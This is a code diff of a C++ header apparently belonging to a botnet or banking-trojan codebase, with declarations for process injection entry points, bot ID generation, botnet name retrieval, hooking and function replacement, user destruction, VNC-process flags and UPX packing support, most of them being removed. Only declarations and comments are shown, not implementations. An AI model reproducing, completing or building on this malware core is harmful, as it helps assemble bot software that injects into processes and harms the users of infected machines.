@@ -49,9 +49,6 @@ typedef struct
 typedef struct
 {
 	PESETTINGS peSettings;									//PE settings stored
-#if BO_PACKED==1
-  MISSING_PE_DATA_INFO relocationInfo;		//to use UPX we need to store original relocation table (.reloc)
-#endif
 }LOADERDATA;
 #pragma pack(pop)
 
@@ -79,7 +76,6 @@ typedef struct
   {
     /*on_copy*/HMODULE current;
     /*on_all*/ HMODULE kernel32;
-    /*on_all*/ HMODULE ntdll;
   }modules;
 
   //Functions for import from ntdll.dll.
@@ -144,9 +140,6 @@ typedef struct
     /*on_copy*/HANDLE stopedEvent;      //Signal to stop global threads of the bot. While true 
 										//only for wow64.
   }globalHandles;
-#if BO_PACKED==1
-  /*on_start*/MISSING_PE_DATA_INFO relocationInfo; //to use UPX we need to store original relocation table (.reloc)
-#endif
 }COREDATA;
 extern COREDATA coreData;
 
@@ -197,13 +190,6 @@ namespace Core
     CDPF_NO_EXITPROCESS                   = 0x002,
     
     /*
-      The process under the VNC-server.
-    */
-#   if(BO_VNC > 0)    
-    CDPF_VNC_ACTIVE                       = 0x004,
-#   endif    
-
-    /*
       Prohibit the creation of processes.
     */
     CDPF_DISABLE_CREATEPROCESS            = 0x010,
@@ -240,9 +226,6 @@ namespace Core
     The mask, The mask, which must be inherited from process to process.
   */
   CDPT_INHERITABLE_MASK                   = CDPF_DISABLE_CREATEPROCESS   
-#                                           if(BO_VNC > 0)    
-                                            | CDPF_VNC_ACTIVE
-#                                           endif    
   };
 
   //flags for init().
@@ -290,24 +273,6 @@ namespace Core
   bool init(DWORD flags);
 
   /*
-    Uninit.
-  */
-  void uninit(void);
-
-  /*
-    Initialization coreData.httpUserAgent. You must call this function before accessing the
-	coreData.httpUserAgent.
-  */
-  void initHttpUserAgent(void);
-
-  /*
-    Setting the default values ​​for Wininet::CALLURLDATA.
-
-    OUT cud - structure for processing.
-  */
-  void initDefaultCallUrlData(Wininet::CALLURLDATA *cud);
-
-  /*
     Create a unique process mutex.
 
     IN pid - process ID.
@@ -317,27 +282,7 @@ namespace Core
   */
   HANDLE createMutexOfProcess(DWORD pid);
 
-  /*
-    Generation named kernel object.
-
-    IN id              - OBJECT_ID_*.
-    OUT buffer         - name (the buffer is less than 50 characters).
-    IN objectNamespace - MalwareTools::KON_*.
-  */
-  void generateObjectName(DWORD id, LPWSTR buffer, BYTE objectNamespace);
-
-  /*
-    Waiting for the mutex release and its capture.
-
-    IN id              - OBJECT_ID_*.
-    IN objectNamespace - MalwareTools::KON_*.
-
-    Return             - mutex handle.
-
-    Note: To release the mutex must call Sync::_freeMutex().
-  */
-  HANDLE waitForMutexOfObject(DWORD id, BYTE objectNamespace);
-  
+ 
   /*
     Initialize a new instance of the module.
 
@@ -352,143 +297,10 @@ namespace Core
   void *initNewModule(HANDLE process, HANDLE processMutex, DWORD proccessFlags);
 
   /*
-    Disable the display of various error messages of the current process.
-    
-    Return - previous error flags SEM_*.
-  */
-  DWORD disableErrorMessages(void);
-
-  /*
-    The substitution of the hooked function to the original, if this is imported through coreData.
-
-    IN oldFunction - address of current function.
-    IN newFunction - address of new function.
-  */
-  void replaceFunction(const void *oldFunction, const void *newFunction);
-
-  /*
-    Function to check that the current kernel is active and should provide a functionality.
-    (for example if the bot will be updated with a newer version, the kernel will not be active).
-
-    Return - true - active,
-             false - not active.
-  */
-  bool isActive(void);
-  
-  /*
-    Destruction of functions by inserting random characters.
-
-    IN p - function.
-  */
-  void _destroyFunction(void *p);
-
-  /*
-    Generation of computer identifier.
-
-    OUT buf - buffer for identifier, at least 60 characters.
-  */
-  void _generateBotId(LPWSTR buf);
-
-  /*
-    Obtaining basic configuration.
-    
-    OUT bc - BASECONFIG.
-  */
-  void getBaseConfig(BASECONFIG *bc);
-
-  /*
-    Obtaining PESETTINGS.
-    
-    OUT ps - PESETTINGS.
-  */
-  void getPeSettings(PESETTINGS *ps);
-
-  /*
-    Retrieves the full path to the path recorded in PESETTINGS.
-
-    IN type  - type PSP_*.
-    OUT path - path.
-  */
-  void getPeSettingsPath(DWORD type, LPWSTR path);
-  
-  /*
-    Load data from register BDR_*.
-
-    IN type   - the type of value RV_*.
-    OUT key   - registry key. Buffer size CORE_REGISTRY_KEY_BUFFER_SIZE.
-    OUT value - registry value. Buffer size CORE_REGISTRY_VALUE_BUFFER_SIZE.
-  */
-  void getRegistryValue(DWORD type, LPWSTR key, LPWSTR value);
-  
-  /*
-    Getting the name of the current botnet.
-
-    OUT name - buffer.
-  */
-  void getCurrentBotnetName(LPWSTR name);
-  
-  /*
-    Getting data from the overlay.
-    
-    IN image           - image.
-    IN OUT overlaySize - on input - memory size, on output data size of the overlay.
-
-    Return             - overlay, must be freed by Mem. Or NULL - in case of error.
-  */
-  void *getBaseOverlay(const void *mem, LPDWORD size);
-  
-  /*
-    Storing data in the overlay.
-
-    IN image    - image.
-    IN size     - memory size.
-    IN data     - overlay.
-    IN dataSize - overlay size.
-
-    Return      - true - in case of success,
-                  false - in case of error.
-  */
-  bool setBaseOverlay(void *mem, DWORD size, const void *data, DWORD dataSize);
-
-  /*
-    Waiting for start of kernel services in the current process.
-
-    IN waitStop - true - wait for the completion of all service threads,
-                  false - exit the function immediately after creating services.
-  */
-  void createServices(bool waitStop);
-
-  /*
-    The destruction of the current user.
-  */
-  bool destroyUser(void);
-
-  /*
-    Displays information about the built bot.
-
-    IN type - SIB_*.
-    
-    Return  - true - in case of success,
-              false - in case of error.
-  */
-  bool showInfoBox(BYTE type);
-
-  /*
-    The entry point as injector of the module.
-
-    Return - return code.
-  */
-  int WINAPI _injectEntryForModuleEntry(void);
-
-  /*
     The entry point inject as a point thread entry.
 
     Return - return code.
   */
   DWORD WINAPI _injectEntryForThreadEntry(void *);
 
-  /*
-    The main entry point.
-  */
-  void WINAPI _entryPoint(void);
 };
